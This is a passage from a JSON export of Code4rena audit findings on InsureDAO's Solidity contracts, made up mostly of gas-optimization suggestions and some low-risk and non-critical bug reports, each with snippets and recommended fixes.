public returns (uint256 _mintAmount) {     _depositFrom(_amount, msg.sender); } ```  "}, {"title": "Emit an event in setKeeper()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/132", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The `setKeeper()` function is operated only by the owner, and should emit an event when the keeper is set for the first time and/or changes  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L502](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L502)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Add `emit KeeperChanged(address)` after changing the keeper  "}, {"title": "No-op in CDSTemplate.sol' withdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/130", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The amount of the withdrawal request is not correctly updated after a withdrawal in `CDSTemplate.sol`. This happens because the withdrawal request is read from storage and put in memory, like this:  ```jsx Withdrawal memory request = withdrawalReq[msg.sender]; ```  However, the requested amount is not updated properly since the `withdrawalReq` in the storage is never updated. Instead, its in-memory version is updated, but it\u2019s useless because that object is never used again:  ```jsx //reduce requested amount request.amount -= _amount; ```  This issue is non critical because there is a function that takes care of updating the withdrawal requests\u2019 amount on every token transfer: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L358](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L358)  The issue lies in the fact that the code seems to behave differently from how it looks at a first glance. Furthermore, the other two templates correctly update the value of the withdrawal request, so the version in `CDSTemplate.sol` should be aligned as well:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L239](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L239) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L327](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L327)  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L230](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L230)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Update the `amount` of the current withdrawal request as well  "}, {"title": "resume() can be called by anyone in IndexTemplate.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/129", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The `resume` function can be called by any user, at any time, even when the Index contract is not locked. There should be a check preventing it from being called unless the contract is `locked`  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L459](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L459)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Add a require on top:  ```jsx require(locked); ```  "}, {"title": "Wrong revert string in withdraw functions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/128", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `PoolTemplate.sol` and `IndexTemplate.sol` report this same error when trying to withdraw and some conditions are not met: \"ERROR: WITHDRAWAL_PENDING\u201d  However, `PoolTemplate.sol` does that when the `marketStatus` is not `Trading`; `IndexTemplate.sol` when the contract is locked. Since `CDSTemplate.sol`, instead, implement a different revert string, it\u2019s best for understanding what revert strings are related to by making them as explicit and clear as possible. `CDSTemplate.sol` has this in the `withdraw` function:  ```jsx require(paused == false, \"ERROR: PAUSED\"); ```  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217)  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L302](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L302)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Improve revert strings wording  "}, {"title": "repayDebt in Vault.sol could DOS functionality for markets", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/126", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "repayDebt in Vault.sol could DOS functionality for markets"}, {"title": "call emit from storage is more expensive", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L685 the function emitted a `MarketStatusChanged` event with storage variable which is `marketStatus`. when we emit an event using storage data is more expensive than emitted an event using `MarketStatus.Payingout` value.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L685 ``` contract emitstatust {      enum MarketStatus {         Trading,         Payingout     }     MarketStatus public marketStatus;      event MarketStatusChanged(MarketStatus statusValue);      function amit() public {          marketStatus = MarketStatus.Payingout;      emit MarketStatusChanged(marketStatus);      } } //44792 gas ```  can change to :  ``` contract emitstatust {      enum MarketStatus {         Trading,         Payingout     }     MarketStatus public marketStatus;      event MarketStatusChanged(MarketStatus statusValue);      function amit() public {          marketStatus = MarketStatus.Payingout;      emit MarketStatusChanged(MarketStatus.Payingout);      } } //44659 gas ```  ## Tools Used remix   "}, {"title": "save Insurance data directly to storage can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L508 instead of save `Insurance` value to memory then save to `insurences` storage it's better to save the `Insurence` value directly to `insurences`  storage or mapping to save gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L508 ``` contract insur {      struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     }       mapping(uint256 => Insurance) public insurances;      function coba() public {          uint256 _id = 10;         uint256 _endTime = 10;         uint256 _amount = 12;         bytes32 _target = bytes32(uint256(10));           Insurance memory _insurance = Insurance(             _id,             block.timestamp,             _endTime,             _amount,             _target,             msg.sender,             true         );         insurances[_id] = _insurance;      } } //154623 gas ```  change to : ``` contract insur {      struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     }       mapping(uint256 => Insurance) public insurances;      function coba() public {          uint256 _id = 10;         uint256 _endTime = 10;         uint256 _amount = 12;         bytes32 _target = bytes32(uint256(10));           insurances[_id] = Insurance(             _id,             block.timestamp,             _endTime,             _amount,             _target,             msg.sender,             true         );               } } //154610 gas  ```  ## Tools Used remix  "}, {"title": "unnecessary double `totalLiquidity()` call in function availableBalance", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by saving `totalLiquidity()` to memory can save more gas instead of doing double function call  ## Proof of Concept Before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L829 // gas cost 23862  After: ``` function totalLiquidity() public view returns (uint256){      return 10;  }     function availableBalance()public view returns (uint256 _balance)     {         uint256 saveTotalLiquidity = totalLiquidity();         if (saveTotalLiquidity > 0) {             return saveTotalLiquidity - lockedAmount;         } else {             return 0;         }     } ``` // gas cost 23840  ## Tools Used Remix  "}, {"title": "Lack of inputs in Factory", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/120", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Wrong deployment.  ## Proof of Concept The factory contract haven't got any check of `_registry` and `_ownership` and both values must be defined or the logic inside the contract will fault.  ## Tools Used Manual review.  ## Recommended Mitigation Steps It's mandatory to check that the address are not zero or the contract could be wrong deployed.  "}, {"title": "Gas saving caching the value", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept There are multiple methods in `Registry` that check a value inside the storage and if it's not defined, use the default one. It's better to cache the value in order to save gas if it was defined avoiding double reading.  For example, instead of the following code: ```     function getCDS(address _address) external view override returns (address) {         if (cds[_address] == address(0)) {             return cds[address(0)];         } else {             return cds[_address];         }     } ``` use ```     function getCDS(address _address) external view override returns (address) {         address val =cds[_address];         if ( val== address(0)) {             return cds[address(0)];         } else {             return val;         }     } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Cache the value.  "}, {"title": "split one require to two require can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/113", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260 have two check inside the require which is `marketStatus == MarketStatus.Trading` and `paused == false` and by spliting this check we can save gas.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260  ``` function woi() public {          require(             marketStatus == MarketStatus.Trading && paused == false,             \"ERROR: DEPOSIT_DISABLED\"         );      } // 23645 gas ```   can be change to   ``` function woi() public{           require(             marketStatus == MarketStatus.Trading, \"ERROR: DEPOSIT_DISABLED\"         );         require(               paused == false, \"ERROR: DEPOSIT_DISABLED\"         );      } //23637 gas ```     "}, {"title": "avoid using 'else' code can save gas in function pendingPremium", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by changing the code from `if (_credit == 0) {` to `if (_credit != 0) {` and remove the else we can save gas when contract is deploy and we can save gas when `_credit` is equal to 0. because if `_credit` equal to 0 the original function will return 0 which a default value for uint256  ## Proof of Concept Before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L776 // gas 24307  After: ``` function pendingPremium(address _index)         external         view         returns (uint256)     {         uint256 _credit = indicies[_index].credit;        if (_credit != 0) {             return                 _sub(                     (_credit * rewardPerCredit) / MAGIC_SCALE_1E6,                     indicies[_index].rewardDebt                 );         }     } ``` // gas 24286   ## Tools Used Remix  ## Recommended Mitigation Steps  "}, {"title": "Missing validation of address argument could indefinitely lock Registry contract", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/110", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  the owner parameter are used for the onlyOwner modifier. In the state variable , proper check up should be done , other wise error in these state variable can lead to redeployment of contract. If the zero address is assigned to rebalanceManager parameter, that will fail all Owner functions.  ## Proof of Concept  1. Navigate to the following contract functions.  \"https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L31\"  2. Adding zero address into the owner leads to failure of onlyOwner only functions.  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Add proper zero address validation.  "}, {"title": "in function _sub, less gas used using unchecked", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/108", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by using 'unchecked' you can save  +-182 gas  ## Proof of Concept before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L938 //22378 before  after: ``` function _sub(uint256 a, uint256 b) public pure returns (uint256) {         if (a < b) {             return 0;         } else {             unchecked {return a - b;}         }     }   ``` //22196 after   ## Tools Used Remix  ## Recommended Mitigation Steps used 'unchecked' in function _sub  "}, {"title": "Uncontrolled call to controller, which can be the zero address", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact The `utilize()` function can be called while the controller is the zero address. This will fail. A comment in the constructor says that the controller shouldn't be the zero address.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L350  ## Recommended Mitigation Steps `utilize` should have a check to see if the controller is not the zero address (like `_unutilize`) and give an appropriate error message.  "}, {"title": "Gas optimization in Vault.addValueBatch()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept The `for` loop at [L109-113](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L109-L113) can be unrolled to remove the overhead of the loop itself, and avoid using an initialized-to-zero uint128 variable.  ## Tools Used Manual review  ## Recommended Mitigation Steps Replace L109-113 with: ``` uint256 _allocation = (_shares[0] * _attributions) / MAGIC_SCALE_1E6; attributions[_beneficiaries[0]] += _allocation; _allocations[0] = _allocation;  _allocation = (_shares[1] * _attributions) / MAGIC_SCALE_1E6; attributions[_beneficiaries[1]] += _allocation; _allocations[1] = _allocation; ```  "}, {"title": "Shorten Error Messages to Save Gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  Error Messages that have a length of 32 or more one require one additional slot to be stored, causing extra gas costs when deploying the contract and when the function is executed and it reverts.  ## Proof of Concept  I put together a quick proof to show the different impact of the errors we can have in Solidity:  - Long require errors => more than 32 bytes - Short require errors => less than 32 bytes - Custom errors  Here are the contract size findings:  ```rust //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  contract Errors {   bool public thisIsFalse;   error WithdrawalExceeded();    /*     Contract Size with just this function: 333 bytes;   */   function moreThan32Bytes() public {     require(thisIsFalse, \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\");   }    /*     Contract Size with just this function: 295 bytes; //   */   function lessThan32Bytes() public {     require(thisIsFalse, \"WITHDRAWAL_EXCEEDED_REQUEST\");   }    /*     Contract Size with just this function: 242 bytes;   */   function customError() public {     if (!thisIsFalse) revert WithdrawalExceeded();   } } ```  I then run tests to see the gas costs of having the functions revert, and although these are not very accurate due to the fact that it\u2019s hard to isolate the gas costs of a reverting function due to the order of execution (I can\u2019t have an event that logs the gas before the function revert and another one after because the one after the revert will never be reached), it still shows some differences.  ```rust //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  import \"ds-test/test.sol\"; import \"../Errors.sol\";  contract ErrorsTest is DSTest {   Errors errors;    function setUp() public {     errors = new Errors();   }    function testFailLessThan32Bytes() public logs_gas {     errors.lessThan32Bytes();   }    function testFailMoreThan32Bytes() public logs_gas {     errors.moreThan32Bytes();   }    function testFailCustomError() public logs_gas {     errors.customError();   } } ```  ```rust Running 3 tests for \"ErrorsTest.json\":ErrorsTest [PASS] testFailCustomError() (gas: 3161) [PASS] testFailLessThan32Bytes() (gas: 3314) [PASS] testFailMoreThan32Bytes() (gas: 3401) ```  ## Tools Used  DappTools/Foundry  ## Recommended Mitigation Steps  Personally, I would switch to custom errors and reverts to maximize the savings, but if you dislike revert syntax, then I would suggest to check which of your require errors have a length longer than 32, and shorten them so that their length is less than 32.  Here are some examples of the errors you could shorten in your `CDSTemplate.sol` contract:  - `ERROR: INITIALIZATION_BAD_CONDITIONS` - `ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST` - `ERROR: WITHDRAWAL_EXCEEDED_REQUEST`  Removing the \u201cERROR\u201d keyword should be enough for most of these. Bear in mind you can always have concise error messages and a section in your documentation that explains them further or have your natspec expand on them if you find them too cryptic.   An example of how to apply a custom error in the first error would be to just have the error `say BadConditions()`. The user knows it\u2019s an error because the function call failed, and the user knows it has happened in the initialize function because he called it, so `BadConditions()` should be a clear message despite being concise  "}, {"title": "Loss of precision and increased gas cost with double assignment on a calculation  ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/84", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  In `IndexTemplate.sol:withdrawable()`, the following can be optimized to save gas and avoid a loss of precision, from: ```                 uint256 _necessaryAmount = _targetLockedCreditScore * totalAllocPoint /  _targetAllocPoint;                 _necessaryAmount = _necessaryAmount *  MAGIC_SCALE_1E6 / targetLev; ``` to ```                 uint256 _necessaryAmount = _targetLockedCreditScore * totalAllocPoint *  MAGIC_SCALE_1E6 /  (_targetAllocPoint * targetLev); ```  "}, {"title": "Gas: Use `else if` to save gas and simplify code", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/83", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `IndexTemplate.sol:_adjustAlloc()`, the 3 following conditions are always evaluated: ```                 //Withdraw or Deposit credit                 if (_current > _target && _available != 0) {                     //if allocated credit is higher than the target, try to decrease                     uint256 _decrease = _current - _target;                     IPoolTemplate(_poolList[i].addr).withdrawCredit(_decrease);                     totalAllocatedCredit -= _decrease;                 }                 if (_current < _target) {                     uint256 _allocate = _target - _current;                     IPoolTemplate(_poolList[i].addr).allocateCredit(_allocate);                     totalAllocatedCredit += _allocate;                 }                 if (_current == _target) {                     IPoolTemplate(_poolList[i].addr).allocateCredit(0);                 } ``` The code can be optimized to save some gas: ```                 if (_current == _target) {                     IPoolTemplate(_poolList[i].addr).allocateCredit(0);                 } else if (_current < _target) {                     uint256 _allocate = _target - _current;                     IPoolTemplate(_poolList[i].addr).allocateCredit(_allocate);                     totalAllocatedCredit += _allocate;                 } else if (_current > _target && _available != 0) {                     //Withdraw or Deposit credit                     //if allocated credit is higher than the target, try to decrease                     uint256 _decrease = _current - _target;                     IPoolTemplate(_poolList[i].addr).withdrawCredit(_decrease);                     totalAllocatedCredit -= _decrease;                 } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "Gas: Short-circuiting in an if-statement", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact > The operators \u201c||\u201d and \u201c&&\u201d apply the common short-circuiting rules. This means that in the expression \u201cf(x) || g(y)\u201d, if \u201cf(x)\u201d evaluates to true, \u201cg(y)\u201d will not be evaluated even if it may have side-effects.  Source: https://docs.soliditylang.org/en/v0.5.4/types.html#booleans  ## Proof of Concept In `IndexTemplate.sol:withdrawable()`, there's an if-statement as such: ``` 293:                         if (i == 0 || _availableRate < _lowestAvailableRate) { ``` Here, the condition `i == 0` is always evaluated and is always equal to `false` when `i > 0`, meaning here a total of `poolList.length - 1` evaluations are always evaluated to `false`.  It's best to reorder the conditions such as this condition doesn't get evaluated if `_availableRate < _lowestAvailableRate` is satisfied: ``` 293:                         if (_availableRate < _lowestAvailableRate || i == 0 ) { ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "Gas: Redundant if-statement with the for-loop condition", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `Factory.sol`, the following `> 0` checks are redundant with the for-loop condition, because if `_references.length == 0` or `_conditions.length == 0`, the condition `uint256 i = 0; i <(_conditions)|(_references).length` will never be satisfied and the for-loop won't iterate: ``` 175:         if (_references.length > 0) { 176:             for (uint256 i = 0; i < _references.length; i++) { 177:                 require( 178:                     reflist[address(_template)][i][_references[i]] == true || 179:                         reflist[address(_template)][i][address(0)] == true, 180:                     \"ERROR: UNAUTHORIZED_REFERENCE\" 181:                 ); 182:             } 183:         } 184:  185:         if (_conditions.length > 0) { 186:             for (uint256 i = 0; i < _conditions.length; i++) { 187:                 if (conditionlist[address(_template)][i] > 0) { 188:                     _conditions[i] = conditionlist[address(_template)][i]; 189:                 } 190:             } 191:         }  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove these 2 if-statements  "}, {"title": "Gas: Avoid double assignment on variable", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept The variable `T_0` can go through 2 assignments in a row: Here: ``` 75:         uint256 T_0 = _totalLiquidity; 76:         if (T_0 > T_1) { 77:             T_0 = T_1; 78:         } ``` And here: ``` 134:         uint256 T_0 = _totalLiquidity; 135:         if (T_0 > T_1) { 136:             T_0 = T_1; 137:         } ```  The code can be optimized as such to save some gas: ```         uint256 T_0 = _totalLiquidity > T_1 ? _totalLiquidity : T_1; ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto   "}, {"title": "`CDSTemplate.sol:compensate` code optimization", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Duplicated code, loss of maintainability, increased contract size which leads to increased gas cost  ## Proof of Concept The following can be simplified: ``` 260:         if (_available >= _amount) { 261:             _compensated = _amount; 262:             _attributionLoss = vault.transferValue(_amount, msg.sender); 263:             emit Compensated(msg.sender, _amount); 264:         } else { 265:             //when CDS cannot afford, pay as much as possible 266:             _compensated = _available; 267:             _attributionLoss = vault.transferValue(_available, msg.sender); 268:             emit Compensated(msg.sender, _available); 269:         } ``` to ``` 260:         _compensated = _available >= _amount ? _amount : _available; //when CDS cannot afford, pay as much as possible 261:         _attributionLoss = vault.transferValue(_compensated, msg.sender); 262:         emit Compensated(msg.sender, _compensated); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto and look out for duplicated code  "}, {"title": "Gas: Contracts inheriting `InsureDAOERC20` don't need to import some dependencies *again*", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/78", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact When a contract imports and implements an interface or another contracts, it doesn't need to import the libraries that were already imported there.  Removing these imports will save gas.  ## Proof of Concept `InsureDAOERC20` imports the following:  ``` 5: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 6: import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\"; ```  The following contracts inherit `InsureDAOERC20` and also make those imports: `CDSTemplate`, `IndexTemplate`, `PoolTemplate`  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused imports to reduce the size of the contract and save some deployment gas.  "}, {"title": "unnecessary checked postfix arithmetics", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/76", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  egjlmn1   # Vulnerability details  in all of your for loops, you increase your loop variable using `i++` it has 2 problems: 1. postfix increment is more wasteful than prefix increment (`++i` instead of `i++`) 2. there is no risk for overflow, so you can use `unchecked{}`  ## Impact prefix arithmetic is a bit cheaper than postfix arithmetic, but if you do it in a for loop, this small amount of gas can pile up and be a big waste. also, in solidity 0.8.0+, every arithmetic operation is checked for overflow and underflow, which adds a lot of gas to a single operation. Since in your for loop you don't have the risk for overflow, you can surround the operation in `unchecked{}` to save a lot of gas (which will save a huge amount since it saves a lot in a single loop iteration.)  ## Proof of Concept Checked on remix  ## Tools Used manual code review  ## Recommended Mitigation Steps change every `i++` in your for loops to `unchecked{++i}`  "}, {"title": "Gas: Consider making variables that aren't updated outside the constructor as `immutable`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The compiler won't reserve a storage slot for `immutable` variables  ## Proof of Concept The following variables are initialized in the contract's constructor and can't get updated after: ``` Factory.sol:registry Factory.sol:ownership Parameters:ownership BondingPremium:ownership Registry:ownership Vault:ownership ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Make these variables `immutable`  "}, {"title": "Gas: Costly operations inside a loop (`IndexTemplate._adjustAlloc()`)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Repetitive and expensive SSTORE opcode operations inside loops  ## Proof of Concept ```  totalAllocatedCredit -= _available (contracts/IndexTemplate.sol#368)  totalAllocatedCredit -= _decrease (contracts/IndexTemplate.sol#395)  totalAllocatedCredit += _allocate (contracts/IndexTemplate.sol#401) ```  ## Tools Used Slither  ## Recommended Mitigation Steps Create a memory variable which will be used to compute a `_totalAllocatedCredit` that will get added to `totalAllocatedCredit` storage variable outside the loop. As an idea, you could create 1 such `int` variable and use it's value after the for-loop, or you could create 2 uint variables where 1 would store the _totalDecrease and 1 would store the _totalAllocate, and respectively substract and add them.   "}, {"title": "Gas: Storage variable `IndexTemplate:pendingEnd#62` is never used and should be deleted", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 slot)  ## Proof of Concept IndexTemplate.pendingEnd (contracts/IndexTemplate.sol#62) should be deleted as it's never used by the contract  ## Tools Used Slither  ## Recommended Mitigation Steps Delete the variable `IndexTemplate.pendingEnd`  "}, {"title": "Gas: Unnecessary checked arithmetic when no overflow/underflow possible", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact  Increased gas cost.   ## Proof of Concept  Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers.  When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block.  https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic  These lines are the obvious ones that can't underflow or overflow (operations on constants or checks already made before the operations with `require` statements or `if` statements): ```  PremiumModels\\BondingPremium.sol:47:        T_1 = 1000000 * DECIMAL; PremiumModels\\BondingPremium.sol:130:        uint256 u1 = BASE - ((_lockedAmount * BASE) / _totalLiquidity); //util rate before. 1000000 = 100.000% PremiumModels\\BondingPremium.sol:132:            (((_lockedAmount + _amount) * BASE) / _totalLiquidity); //util rate after. 1000000 = 100.000% IndexTemplate.sol:292:                        uint256 _lockedCredit = _allocated - _availableBalance; PoolTemplate.sol:942:            return a - b; IndexTemplate.sol:308:                    _retVal = _totalLiquidity - _necessaryAmount; IndexTemplate.sol:393:                    uint256 _decrease = _current - _target; IndexTemplate.sol:399:                    uint256 _allocate = _target - _current; IndexTemplate.sol:441:                _shortage = _amount - _value; InsureDAOERC20.sol:255:        _balances[sender] = senderBalance - amount; InsureDAOERC20.sol:303:        _balances[account] = accountBalance - amount; Vault.sol:165:            uint256 _shortage = _amount - available(); Vault.sol:310:            uint256 _shortage = _retVal - available(); ```   ## Tools Used  VS Code   ## Recommended Mitigation Steps Uncheck arithmetic operations when the risk of underflow or overflow is already contained.  "}, {"title": "too much centralization in the vault, the vault owner can withdraw all the value in the vault", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/65", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "too much centralization in the vault, the vault owner can withdraw all the value in the vault"}, {"title": "Gas: Use `calldata` instead of `memory` for external functions where the function argument is read-only.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   On external functions, when using the `memory` keyword with a function argument, what's happening is that a `memory` acts as an intermediate.      Reading directly 